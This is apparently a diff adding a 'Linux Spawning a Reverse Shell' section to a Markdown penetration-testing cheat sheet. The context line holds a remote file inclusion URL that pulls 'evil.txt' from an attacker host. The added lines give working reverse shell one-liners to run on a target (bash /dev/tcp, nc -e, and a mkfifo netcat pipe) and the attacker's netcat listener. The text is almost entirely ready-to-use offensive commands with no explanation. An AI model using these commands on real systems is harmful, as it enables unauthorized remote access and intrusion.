@@ -196,3 +196,12 @@ http://target.com/?page=http://attackerIP/evil.txt%00
 ```
 
 
+## Linux Spawning a Reverse Shell
+**-Netcat** <br />
+```sh 
+Target : 
+bash -i >& /dev/tcp/192.168.1.69/443 0>&1 
+nc -e /bin/sh 10.0.0.1 1234
+//without -e : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+Attacker : nc -nlvp 443
+```
